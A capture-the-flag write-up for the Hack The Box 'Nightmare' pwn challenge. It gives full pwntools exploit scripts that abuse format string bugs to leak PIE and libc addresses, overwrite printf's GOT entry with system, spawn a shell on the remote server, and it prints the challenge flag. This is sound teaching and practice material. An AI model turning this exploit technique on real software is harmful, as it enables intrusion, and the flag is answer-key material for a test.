# Nightmare
> Write-up author: jon-brandy
## DESCRIPTION:
You seem to be stuck in an endless nightmare. Can you find a way out?
## HINT:
- NONE
## STEPS:
1. In this challenge we're given a 64 bit binary , stripped, and with **NO RELRO**.

![image](https://github.com/Bread-Yolk/hackthebox/assets/70703371/05cea160-e903-4d4d-a710-7caac4a7acad)

![image](https://github.com/Bread-Yolk/hackthebox/assets/70703371/4ba73284-daca-4972-98d7-029cc3d7751c)


2. The exploit here is we need to leak the leak and calculate the piebase and libc_base then.
3. After decompiled the binary using ghidra, i noticed there's a format string vulnerability for first option menu and second option menu.

> This function called when user choose the 1st option menu.

#### NOTES: The format string vuln found at line 12, the binary seems not specify the output format.

![image](https://github.com/Bread-Yolk/hackthebox/assets/70703371/8e3b5d39-54d2-4899-b8d8-1628b7c5e2ec)


> This function called when user choose the 2nd option menu.

#### NOTES: The format strings vuln found at line 19.

![image](https://github.com/Bread-Yolk/hackthebox/assets/70703371/4034274f-e571-4ff5-b207-26f3010dbd35)


4. Well seems like the intended approach to leak the piebase and libc_base are from the format strings, because there are no potential bufferoverflow.
5. I chose to use the first option, this is the script i used to leak the piebase and libc_base.

> Fuzzy script

```py
from pwn import *
import os 

os.system('clear')

def start(argv=[],  *a, **kw):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2],  *a, **kw)
    elif args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript ='''
init-pwndbg
piebase
breakrva 0x138c
continue
'''.format(**locals())

exe = './nightmare'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'INFO'

sh = start()

for i in range(100):
    try:
        #sh = process()
        sh.sendlineafter(b'>', b'1')
        sh.recvuntil(b'>')
        print("Iter {}:".format(i))
        sh.sendline('%{}$p'.format(i))
        sh.recvuntil(b'> ')
        get = sh.recvlineS()
        print(get)
        #sh.close()
    except EOFError:
        pass

sh.interactive()
```

6. Don't forget to set the GDB script for breakpoint at the `fprintf` so we can use the value leaked for calculating and comparing the piebase and libcbase.
7. But before use the GDB script, let's run with the normal mode.

> At iter 23 and 26 could be the correct one.

![image](https://github.com/Bread-Yolk/hackthebox/assets/70703371/d498e189-d9d3-4904-8a77-eb5e43ab4071)


8. To be honest, to find the correct PIE and libc address, usually i just calculate every address i found until it's the same as the libc_base at the binary (i bruteforced it).
9. Let's calculate the piebase first, now run the script using GDBscript.

> Keep continue, until you hit the 23th iter.

![image](https://github.com/Bread-Yolk/hackthebox/assets/70703371/c1a93a39-7aa5-40fa-8086-75c9f8458982)


> Checking the piebase

![image](https://github.com/Bread-Yolk/hackthebox/assets/70703371/0055561f-c156-4752-a8b1-e69b00b3be39)

> Calculating piebase

![image](https://github.com/Bread-Yolk/hackthebox/assets/70703371/e2969d0d-7484-4aa5-97be-aa86046c2ebc)


10. This means we need to minus the leaked pie with `13792`.

> SCRIPT

```py
from pwn import *
import os 

os.system('clear')

def start(argv=[],  *a, **kw):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2],  *a, **kw)
    elif args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript ='''
init-pwndbg
piebase
breakrva 0x138c
continue
'''.format(**locals())

exe = './nightmare'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'INFO'

sh = start()

'''
for i in range(100):
    try:
        #sh = process()
        sh.sendlineafter(b'>', b'1')
        sh.recvuntil(b'>')
        print("Iter {}:".format(i))
        sh.sendline('%{}$p'.format(i))
        sh.recvuntil(b'> ')
        get = sh.recvlineS()
        print(get)
        #sh.close()
    except EOFError:
        pass
'''

sh.sendlineafter(b'>', b'1')
sh.sendlineafter(b'>', '%23$p')
sh.recvuntil(b'>')
get_leak_pie = sh.recvlineS()
leak = int(get_leak_pie, 16)
log.success('Leaked pie --> %#0x', leak)

pie_base = leak - 13792
log.info('This is the actual pie_base --> %#0x', pie_base)

sh.interactive()
```

> RESULT - GOT THE SAME RESULT - Means we grab the correct one.

![image](https://github.com/Bread-Yolk/hackthebox/assets/70703371/d79abe08-d25d-4173-a356-569d623f40c2)


11. Now calculate the libc_base.

> Grab at iter 26 (our previously potential libc address) and get the distance to the libc_system_base.

![image](https://github.com/Bread-Yolk/hackthebox/assets/70703371/3b3d3765-449a-42fa-af5d-7f81e7ebcfbc)


> Calculate with python script

```py
from pwn import *
import os 

os.system('clear')

def start(argv=[],  *a, **kw):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2],  *a, **kw)
    elif args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript ='''
init-pwndbg
piebase
breakrva 0x138c
continue
'''.format(**locals())

exe = './nightmare'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'INFO'

sh = start()

'''
for i in range(100):
    try:
        #sh = process()
        sh.sendlineafter(b'>', b'1')
        sh.recvuntil(b'>')
        print("Iter {}:".format(i))
        sh.sendline('%{}$p'.format(i))
        sh.recvuntil(b'> ')
        get = sh.recvlineS()
        print(get)
        #sh.close()
    except EOFError:
        pass
'''

sh.sendlineafter(b'>', b'1')
sh.sendlineafter(b'>', '%23$p')
sh.recvuntil(b'>')
get_leak_pie = sh.recvlineS()
leak = int(get_leak_pie, 16)
log.success('Leaked pie --> %#0x', leak)

pie_base = leak - 13792
log.info('This is the actual pie_base --> %#0x', pie_base)

sh.sendlineafter(b'>', b'1')
sh.sendlineafter(b'>', '%26$p')
sh.recvuntil(b'>')
get_leak_libc_system = sh.recvlineS()
leaked_libc_system = int(get_leak_libc_system, 16)
log.success('Leaked libc system address --> %#0x', leaked_libc_system)

libc_system_binary = leaked_libc_system - 1599312
log.info('This is the calculated_libc_system --> %#0x', libc_system_binary)

sh.interactive()
```

> It's correct

![image](https://github.com/Bread-Yolk/hackthebox/assets/70703371/7c1414bd-03a1-4ec3-9df5-805184317d42)

> Calculate the libc_base

![image](https://github.com/Bread-Yolk/hackthebox/assets/70703371/4596ca09-9ea8-4d62-9feb-18b51a3dddd7)


```py
libc_base = libc_system_binary - 0x4c330 
log.info('This is the libc_base --> %#0x', libc_base)
```

12. Great! Since we have the libc_base now we can calculate the binsh address, simply using this formula:

![image](https://github.com/Bread-Yolk/hackthebox/assets/70703371/deb346f4-3ad5-458e-a09f-2e58473c5c6f)


> Formula

```py
binsh = libc_base + 0x196031
log.info('This is the binsh strings address --> %#0x', binsh)
```

> FULL SCRIPT (so far..)

```py
from pwn import *
import os 

os.system('clear')

def start(argv=[],  *a, **kw):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2],  *a, **kw)
    elif args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript ='''
init-pwndbg
piebase
breakrva 0x138c
continue
'''.format(**locals())

exe = './nightmare'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'INFO'

sh = start()

'''
for i in range(100):
    try:
        #sh = process()
        sh.sendlineafter(b'>', b'1')
        sh.recvuntil(b'>')
        print("Iter {}:".format(i))
        sh.sendline('%{}$p'.format(i))
        sh.recvuntil(b'> ')
        get = sh.recvlineS()
        print(get)
        #sh.close()
    except EOFError:
        pass
'''

sh.sendlineafter(b'>', b'1')
sh.sendlineafter(b'>', '%23$p')
sh.recvuntil(b'>')
get_leak_pie = sh.recvlineS()
leak = int(get_leak_pie, 16)
log.success('Leaked pie --> %#0x', leak)

pie_base = leak - 13792
log.info('This is the actual pie_base --> %#0x', pie_base)

sh.sendlineafter(b'>', b'1')
sh.sendlineafter(b'>', '%26$p')
sh.recvuntil(b'>')
get_leak_libc_system = sh.recvlineS()
leaked_libc_system = int(get_leak_libc_system, 16)
log.success('Leaked libc system address --> %#0x', leaked_libc_system)

libc_system_binary = leaked_libc_system - 1599312
log.info('This is the calculated_libc_system --> %#0x', libc_system_binary)

libc_base = libc_system_binary - 0x4c330 
log.info('This is the libc_base --> %#0x', libc_base)

binsh = libc_base + 0x196031
log.info('This is the binsh strings address --> %#0x', binsh)

sh.interactive()
```

> Checking if correct (using GDB)

![image](https://github.com/Bread-Yolk/hackthebox/assets/70703371/6e94782a-6b28-4dea-afcc-5e0e1bebdf35)


13. Finally the last exploit we should do is to overwrite the Global Offset Table (GOT), why need to overwrite? Because there's no BOF but no RELRO. Means we can spawn a shell by overwrite the GOT.
14. We need to overwrite a function of the GOT with **system**.
15. Based from the decompiled binary, it seems the potential overwrite only for the `printf()`.

> At line 19 we can send a strings "/bin/sh" then change the printf() to system() to get the shell.

![image](https://github.com/Bread-Yolk/hackthebox/assets/70703371/c165faf8-22f7-4e93-b72e-e24d2668bc16)


16. But the problem is, we might get an error when system() is called at another LOC remembering there are many printf() called.
17. Anyway let's just try it.
18. First calculate the printf@got address.

> FORMULA

```py
printf_got_addr = pie_base + elf.got['printf']
log.info('This is the printf@got addr --> %#0x', printf_got_addr)
```

> Check it using GDB

![image](https://github.com/Bread-Yolk/hackthebox/assets/70703371/21a71e35-6789-4a06-8c5a-e3e0890c0676)


19. Nice, now we want to get the offset (that it needs to write data, then we can just pass arg) to overwriting the function name, in order to get that easily we can use `FmtStr` from pwntools.
20. But we need to change a little for our approach to leak the piebase and libc_base.

> Modified Script

```py
from pwn import *
import os 

os.system('clear')

def start(argv=[],  *a, **kw):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2],  *a, **kw)
    elif args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript ='''
init-pwndbg
piebase
breakrva 0x138c
continue
'''.format(**locals())

exe = './nightmare'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'INFO'

sh = start()

'''
for i in range(100):
    try:
        #sh = process()
        sh.sendlineafter(b'>', b'1')
        sh.recvuntil(b'>')
        print("Iter {}:".format(i))
        sh.sendline('%{}$p'.format(i))
        sh.recvuntil(b'> ')
        get = sh.recvlineS()
        print(get)
        #sh.close()
    except EOFError:
        pass
'''

## 1st method to leak the pie_base and libc_system_address

'''
sh.sendlineafter(b'>', b'1')
sh.sendlineafter(b'>', '%23$p')
sh.recvuntil(b'>')
get_leak_pie = sh.recvlineS()
leak = int(get_leak_pie, 16)
log.success('Leaked pie --> %#0x', leak)

pie_base = leak - 13792
log.info('This is the actual pie_base --> %#0x', pie_base)

sh.sendlineafter(b'>', b'1')
sh.sendlineafter(b'>', '%26$p')
sh.recvuntil(b'>')
get_leak_libc_system = sh.recvlineS()
leaked_libc_system = int(get_leak_libc_system, 16)
log.success('Leaked libc system address --> %#0x', leaked_libc_system)
'''

## 2nd method use (since we want to get the offset automatically)
## REFERENCE --> https://docs.pwntools.com/en/stable/fmtstr.html

def send_payload(payload): # can determine the correct offset and send our payload auto.
    sh.sendlineafter(b'>', b'1')
    sh.sendlineafter(b'>', payload)
    sh.recvuntil(b'> ')
    return sh.recvline().strip() # cannot using recvlineS() dunno why..

format_str = FmtStr(execute_fmt=send_payload)

leak = int(send_payload('%23$p'), 16)
log.success('Leaked pie --> %#0x', leak)

pie_base = leak - 13792
log.info('This is the actual pie_base --> %#0x', pie_base)

leaked_libc_system = int(send_payload('%26$p'), 16)
log.success('Leaked libc system address --> %#0x', leaked_libc_system)

libc_system_binary = leaked_libc_system - 1599312
log.info('This is the calculated_libc_system --> %#0x', libc_system_binary)

libc_base = libc_system_binary - 0x4c330 
log.info('This is the libc_base --> %#0x', libc_base)

binsh = libc_base + 0x196031
log.info('This is the binsh strings address --> %#0x', binsh)

## REMEMBERING PIE ENABLED, actually need to elf.address = pie_base (for best practice)
printf_got_addr = pie_base + elf.got['printf']
log.info('This is the printf@got addr --> %#0x', printf_got_addr)
```

> RESULT

![image](https://github.com/Bread-Yolk/hackthebox/assets/70703371/ca5dc7c5-bcec-4707-bb6a-07a84eb718b5)


21. Lastly we just need to overwrite the function name to libc_system_address and executes it using these LOC:

```py
format_str = FmtStr(execute_fmt=send_payload)
format_str.write(printf_got_addr, libc_system_binary)

format_str.execute_writes() # perform the writes
```

22. Then let's open option 2 then run the shell by sending `sh`.

> FULL SCRIPT

```py
from pwn import *
import os 

os.system('clear')

def start(argv=[],  *a, **kw):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2],  *a, **kw)
    elif args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript ='''
init-pwndbg
piebase
breakrva 0x138c
continue
'''.format(**locals())

exe = './nightmare'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'INFO'

sh = start()

'''
for i in range(100):
    try:
        #sh = process()
        sh.sendlineafter(b'>', b'1')
        sh.recvuntil(b'>')
        print("Iter {}:".format(i))
        sh.sendline('%{}$p'.format(i))
        sh.recvuntil(b'> ')
        get = sh.recvlineS()
        print(get)
        #sh.close()
    except EOFError:
        pass
'''

## 1st method to leak the pie_base and libc_system_address

'''
sh.sendlineafter(b'>', b'1')
sh.sendlineafter(b'>', '%23$p')
sh.recvuntil(b'>')
get_leak_pie = sh.recvlineS()
leak = int(get_leak_pie, 16)
log.success('Leaked pie --> %#0x', leak)

pie_base = leak - 13792
log.info('This is the actual pie_base --> %#0x', pie_base)

sh.sendlineafter(b'>', b'1')
sh.sendlineafter(b'>', '%26$p')
sh.recvuntil(b'>')
get_leak_libc_system = sh.recvlineS()
leaked_libc_system = int(get_leak_libc_system, 16)
log.success('Leaked libc system address --> %#0x', leaked_libc_system)
'''

## 2nd method use (since we want to get the offset automatically)
## REFERENCE --> https://docs.pwntools.com/en/stable/fmtstr.html

# option local

def send_payload(payload): # can determine the correct offset and send our payload auto.
    sh.sendlineafter(b'>', b'1')
    sh.sendlineafter(b'>', payload)
    sh.recvuntil(b'> ')
    return sh.recvline().strip() # cannot using recvlineS() dunno why..

format_str = FmtStr(execute_fmt=send_payload)

leak = int(send_payload('%23$p'), 16)
log.success('Leaked pie --> %#0x', leak)

pie_base = leak - 13792
log.info('This is the actual pie_base --> %#0x', pie_base)

leaked_libc_system = int(send_payload('%26$p'), 16)
log.success('Leaked libc system address --> %#0x', leaked_libc_system)

libc_system_binary = leaked_libc_system - 1599312
log.info('This is the calculated_libc_system --> %#0x', libc_system_binary)

libc_base = libc_system_binary - 0x4c330 
log.info('This is the libc_base --> %#0x', libc_base)

binsh = libc_base + 0x196031
log.info('This is the binsh strings address --> %#0x', binsh)

## REMEMBERING PIE ENABLED, actually need to elf.address = pie_base (for best practice)
printf_got_addr = pie_base + elf.got['printf']
log.info('This is the printf@got addr --> %#0x', printf_got_addr)

## OVERWRITING "printf" with "system" using FmtStr
format_str = FmtStr(execute_fmt=send_payload)
format_str.write(printf_got_addr, libc_system_binary)

format_str.execute_writes() # perform the writes

sh.sendline(b'2') # go to second menu
sh.sendline(b'sh') # run shell # can't /bin/sh\x00

sh.interactive()
```

> RESULT LOCALLY

![image](https://github.com/Bread-Yolk/hackthebox/assets/70703371/e3d3c239-16dc-4f27-b831-c9f2bcc80ecf)

23. Successfully get the shell locally.
24. Let's try send it remotely.

> REMOTELY

![image](https://github.com/Bread-Yolk/hackthebox/assets/70703371/9a7ce607-41f5-4300-9edf-ecb5e7cf5079)

25. Confused why got out of range.
26. Took me very long to realize that when i ran the same method to leak the PIE or libc by sending --> %26$p manually, it does not reflect any.

> Manually in remote server

![image](https://github.com/Bread-Yolk/hackthebox/assets/70703371/97211c8d-7905-42c3-ad4b-014f79c0d60e)


27. Well this is the mistake, hence the intended solution must be by leaking the address using option 2.
28. Anyway to skip this long walkthrough, just want to tell the approach is the same, the differences just only by the option chosen to leak the address and the libc library used at the remote server.

#### NOTES: I gave comment for every critical changes.

> FINAL SCRIPT

```py
from pwn import *
import os 

os.system('clear')

def start(argv=[],  *a, **kw):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2],  *a, **kw)
    elif args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# for local solve
#gdbscript ='''
#init-pwndbg
#piebase
#breakrva 0x138c
#continue
#'''.format(**locals())

# for remote solve
gdbscript = '''
init-pwndbg
piebase
breakrva 0x1438
continue
'''.format(**locals())

'''
exe = './nightmare'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'INFO'

sh = start()
'''

'''
for i in range(100):
    try:
        #sh = process()
        sh.sendlineafter(b'>', b'1')
        sh.recvuntil(b'>')
        print("Iter {}:".format(i))
        sh.sendline('%{}$p'.format(i))
        sh.recvuntil(b'> ')
        get = sh.recvlineS()
        print(get)
        #sh.close()
    except EOFError:
        pass
'''

'''
## 1st method to leak the pie_base and libc_system_address

sh.sendlineafter(b'>', b'1')
sh.sendlineafter(b'>', '%23$p')
sh.recvuntil(b'>')
get_leak_pie = sh.recvlineS()
leak = int(get_leak_pie, 16)
log.success('Leaked pie --> %#0x', leak)

pie_base = leak - 13792
log.info('This is the actual pie_base --> %#0x', pie_base)

sh.sendlineafter(b'>', b'1')
sh.sendlineafter(b'>', '%26$p')
sh.recvuntil(b'>')
get_leak_libc_system = sh.recvlineS()
leaked_libc_system = int(get_leak_libc_system, 16)
log.success('Leaked libc system address --> %#0x', leaked_libc_system)
'''

## 2nd method use (since we want to get the offset automatically)
## REFERENCE --> https://docs.pwntools.com/en/stable/fmtstr.html

# option local
'''
def send_payload(payload): # can determine the correct offset and send our payload auto.
    sh.sendlineafter(b'>', b'1')
    sh.sendlineafter(b'>', payload)
    sh.recvuntil(b'> ')
    return sh.recvline().strip() # cannot using recvlineS() dunno why..

format_str = FmtStr(execute_fmt=send_payload)

leak = int(send_payload('%23$p'), 16)
log.success('Leaked pie --> %#0x', leak)

pie_base = leak - 13792
log.info('This is the actual pie_base --> %#0x', pie_base)

leaked_libc_system = int(send_payload('%26$p'), 16)
log.success('Leaked libc system address --> %#0x', leaked_libc_system)

libc_system_binary = leaked_libc_system - 1599312
log.info('This is the calculated_libc_system --> %#0x', libc_system_binary)

libc_base = libc_system_binary - 0x4c330 
log.info('This is the libc_base --> %#0x', libc_base)

binsh = libc_base + 0x196031
log.info('This is the binsh strings address --> %#0x', binsh)

## REMEMBERING PIE ENABLED, actually need to elf.address = pie_base (for best practice)
printf_got_addr = pie_base + elf.got['printf']
log.info('This is the printf@got addr --> %#0x', printf_got_addr)

## OVERWRITING "printf" with "system" using FmtStr
#format_str = FmtStr(execute_fmt=send_payload)
format_str.write(printf_got_addr, libc_system_binary)

format_str.execute_writes() # perform the writes

sh.sendline(b'2') # go to second menu
sh.sendline(b'sh') # run shell # can't /bin/sh\x00
'''

## REMOTE EXPLOIT

## NOTES: I did found different behavior of the binary in remote server, hence the exploit kinda different :( 
## But the approach is still the same
'''
def send_payload(payload): # can determine the correct offset and send our payload auto.
    sh.sendlineafter(b'>', b'1')
    sh.sendlineafter(b'>', payload)
    sh.recvuntil(b'> ')
    return sh.recvline().strip() # cannot using recvlineS() dunno why..
'''

exe = './nightmare'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'INFO'

library = './libc6_2.31-0ubuntu9_amd64.so'
libc = context.binary = ELF(library, checksec=False)

## EXTRA --> need to get the offset first
sh = process(exe) # prevent index out of range
option = b'1'

def send_payload(payload): # can determine the correct offset and send our payload auto.
    sh.sendlineafter(b'>', option)
    sh.sendlineafter(b'>', payload)
    sh.recvuntil(b'> ')
    return sh.recvline().strip() # cannot using recvlineS() dunno why..

# get offset
format_str = FmtStr(execute_fmt=send_payload)

sh = start()

option = b'2'
leak = int(send_payload('%9$p'), 16)
log.success('Leaked pie --> %#0x', leak)

pie_base = leak - 5333
log.info('This is the actual pie_base --> %#0x', pie_base)

leaked_libc_system = int(send_payload('%13$p'), 16)
log.success('Leaked libc system address --> %#0x', leaked_libc_system)

# use the leaked address to calculate the libc_base by substract the __libc_start_main_ret from libc.blukat
libc_base = leaked_libc_system - 0x0270b3 #__libc_start_main_ret 
log.success('This is the libc_base --> %#0x', libc_base)

# use the system address from the libc.blukat
#system_addr = libc_base + 0x055410
system_addr = libc_base + libc.sym['system']
log.success('This is the system address --> %#0x', system_addr)

# use the binsh_string from the libc.blukat
bin_sh_strings = libc_base + 0x1b75aa 
log.success('This is the /bin/sh address --> %#0x', bin_sh_strings)

# calculate printf@got
printf_got_addr = pie_base + elf.got['printf']
log.info("printf@got %#0x", elf.got['printf'])
log.success('This is the printf@got address --> %#0x', printf_got_addr)

## ANOTHER EXTRA ---> to prevent menu crash, so we can access the option menu
## This is where the behavior is different from the local binary.
option = b'1' 
sh.send(b'1')

## FINAL ONE
format_str.write(printf_got_addr, system_addr)
format_str.execute_writes() # perform the writes

sh.sendline(b'2')
sh.sendline(b'sh')

sh.interactive()
```

#### NOTES: To get the libc library used, i used the leaked libc_system_address and send it over the libc.blukat

![image](https://github.com/Bread-Yolk/hackthebox/assets/70703371/4a39d5ee-4f24-416d-ac81-8306ad1ac4f7)


> RESULT

![image](https://github.com/Bread-Yolk/hackthebox/assets/70703371/2f22789d-f1fc-4156-b7cd-dd65a33f72c8)


![image](https://github.com/Bread-Yolk/hackthebox/assets/70703371/f6c9e01b-bd79-4964-97cb-f329ffcbc9b7)


29. Got the flag!

## FLAG

```
HTB{ar3_y0u_w0k3_y3t!?}
```

